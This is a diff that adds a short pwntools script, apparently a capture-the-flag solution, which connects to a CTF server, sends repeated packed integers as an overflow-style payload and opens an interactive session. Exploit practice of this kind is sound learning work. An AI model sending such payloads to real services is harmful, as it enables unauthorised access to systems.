@@ -1,0 +1,20 @@
+from pwn import *
+
+r = remote("ctf.j0n9hyun.xyz", 3012)
+
+flag = 0x00500
+
+
+
+payload = p32(1000000) * 10
+
+r.sendline(payload)
+
+payload  = p32(1000000) * 0x100
+
+r.sendline(payload)
+
+
+
+
+r.interactive()
